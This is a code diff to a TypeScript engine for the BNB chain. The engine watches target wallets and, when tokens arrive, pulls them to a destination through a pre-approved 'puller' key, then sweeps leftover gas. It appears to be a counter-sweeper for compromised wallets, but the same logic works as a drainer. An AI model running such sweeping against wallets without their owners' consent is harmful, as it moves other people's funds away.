@@ -1,10 +1,10 @@
-import { webSocket, fallback } from 'viem';
-import { createPublicClient } from 'viem';
+import { createPublicClient, webSocket, fallback } from 'viem';
 import { bsc } from 'viem/chains';
 import { ENV } from '../config/env';
+import { NATIVE } from '../config/constants';
 import { listActive, setAllowanceOk, type Target } from './storage';
-import { pull, usdtBalance, allowanceOf } from './puller';
-import { sendMax, status, address, txLock, signin, verify, NATIVE } from './baw';
+import { pullOne, balanceOf, allowanceOf, gasOf } from './puller';
+import { sendMax, status, address, txLock } from './baw';
 import { notify } from './notify';
 
 const pub = createPublicClient({
@@ -16,11 +16,10 @@ const cache = new Map<string, Target>();
 const inflight = new Set<string>();
 const lastFired = new Map<string, number>();
 const sessionOk = new Map<string, number>();
-const lastUsdt = new Map<string, bigint>();
+const lastBal = new Map<string, bigint>();
 
 const COOLDOWN_MS = 1_500;
 const MAX_TRIES = 3;
-
 const sref = (t: Target) => ({ dir: `t${t.target}`, instanceId: t.instanceId! });
 
 async function refresh() {
@@ -28,28 +27,28 @@ async function refresh() {
     const rows = await listActive();
     cache.clear();
     for (const r of rows) cache.set(r.target, r);
-    for (const r of rows) {
-      if (!lastUsdt.has(r.target)) lastUsdt.set(r.target, await usdtBalance(r.target));
-    }
-    console.log(`[engine] ${cache.size} active target(s)`);
+    console.log(`[engine] ${cache.size} target(s)`);
   } catch (e: any) { console.error('[engine] refresh', e.message); }
 }
 
-async function checkAllowance(t: Target) {
-  if (!t.puller) return false;
-  try {
-    const a = await allowanceOf(t.target, t.puller);
-    const ok = a > 0n;
-    if (ok !== t.allowanceOk) {
-      await setAllowanceOk(t.target, ok);
-      if (!ok) await notify(t.userId, `⚠️ Allowance gone on \`${t.target}\` — puller can't move USDT. Re-approve.`);
-    }
-    return ok;
-  } catch { return false; }
+async function checkAllowances(t: Target) {
+  if (!t.puller) return;
+  for (const tok of t.tokens) {
+    try {
+      const ok = (await allowanceOf(t.target, t.puller, tok.token)) > 0n;
+      if (ok !== tok.allowanceOk) {
+        await setAllowanceOk((tok as any).id, ok);
+        if (!ok) {
+          await notify(t.userId,
+            `⚠️ Allowance gone: \`${tok.token}\` on \`${t.target}\`.\nPuller: \`${t.puller}\`\nRe-approve.`);
+        }
+      }
+    } catch { /* transient */ }
+  }
 }
 
-async function tryPull(t: Target) {
-  const k = `pull:${t.target}`;
+async function tryPull(t: Target, token: `0x${string}`) {
+  const k = `pull:${t.target}:${token}`;
   if (inflight.has(k)) return;
   if (Date.now() - (lastFired.get(k) ?? 0) < COOLDOWN_MS) return;
   if (!t.puller || !t.pullerKey) return;
@@ -58,15 +57,13 @@ async function tryPull(t: Target) {
   lastFired.set(k, Date.now());
   try {
     for (let i = 1; i <= MAX_TRIES; i++) {
-      try {
-        await pull(t.pullerKey, t.target, t.destination);
-        return;
-      } catch (e: any) {
+      try { await pullOne(t.pullerKey, t.target, t.destination, token); return; }
+      catch (e: any) {
         const m = String(e.message || e);
-        console.error(`[pull ${i}] ${t.target}: ${m}`);
-        if (m.includes('ALLOWANCE_ZERO')) { await checkAllowance(t); return; }
+        console.error(`[pull ${i}] ${token} ${t.target}: ${m}`);
+        if (m.includes('ALLOWANCE_ZERO')) { await checkAllowances(t); return; }
         if (m.includes('PULLER_LOW_GAS')) {
-          await notify(t.userId, `⛽ Puller \`${t.puller}\` is out of BNB. Top it up.`);
+          await notify(t.userId, `⛽ Puller \`${t.puller}\` out of BNB. Top up.`);
           return;
         }
         await new Promise(r => setTimeout(r, 200 * i));
@@ -77,8 +74,7 @@ async function tryPull(t: Target) {
 
 async function sessionLive(t: Target) {
   if (!t.instanceId) return false;
-  const last = sessionOk.get(t.target) ?? 0;
-  if (Date.now() - last < 10_000) return true;
+  if (Date.now() - (sessionOk.get(t.target) ?? 0) < 10_000) return true;
   try {
     const s = sref(t);
     const [st, ad] = await Promise.all([status(s), address(s)]);
@@ -89,9 +85,8 @@ async function sessionLive(t: Target) {
   } catch { return false; }
 }
 
-/** Optional: takes the leftover gas so the bot can't restart the cycle. */
 async function bnbLeg(t: Target) {
-  if (!ENV.ENABLE_BNB_LEG || !t.isAgentic || !(await sessionLive(t))) return;
+  if (!ENV.ENABLE_BNB_LEG || !(await sessionLive(t))) return;
   const k = `bnb:${t.target}`;
   if (inflight.has(k)) return;
   inflight.add(k);
@@ -99,28 +94,30 @@ async function bnbLeg(t: Target) {
     const { data } = await txLock(sref(t));
     if (data.status === 'LOCKED') return;
     await sendMax(sref(t), NATIVE, t.destination);
-    console.log(`[BNB LEG] swept gas from ${t.target}`);
+    console.log(`[BNB LEG] ${t.target}`);
   } catch (e: any) {
-    console.error(`[bnb leg] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
+    console.error(`[bnb] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
   } finally { inflight.delete(k); }
 }
 
 async function scan(t: Target) {
-  const bal = await usdtBalance(t.target);
-  const prev = lastUsdt.get(t.target) ?? 0n;
-  lastUsdt.set(t.target, bal);
-
-  if (bal > 0n && bal > prev) {
-    console.log(`[ARRIVAL] ${t.target} +USDT`);
-    await tryPull(t);
-    setTimeout(() => { void bnbLeg(t); }, 1_200);
+  for (const tok of t.tokens) {
+    const bal = await balanceOf(t.target, tok.token);
+    const key = `${t.target}:${tok.token}`;
+    const prev = lastBal.get(key) ?? 0n;
+    lastBal.set(key, bal);
+    if (bal > 0n && bal > prev) {
+      console.log(`[ARRIVAL] ${tok.token} ${t.target}`);
+      await tryPull(t, tok.token);
+      setTimeout(() => { void bnbLeg(t); }, 1_200);
+    }
   }
 }
 
 export async function startEngine() {
   await refresh();
   setInterval(refresh, 4_000);
-  setInterval(() => { for (const t of cache.values()) void checkAllowance(t); }, 300_000);
+  setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 300_000);
 
   let chain: Promise<unknown> = Promise.resolve();
   pub.watchBlocks({
@@ -130,7 +127,7 @@ export async function startEngine() {
         .catch(e => console.error('[cycle]', e.message));
     },
   });
-  console.log('[engine] armed — puller mode, USDT primary');
+  console.log('[engine] armed — puller mode');
 }
 
-export { signin, verify };
+export { gasOf };
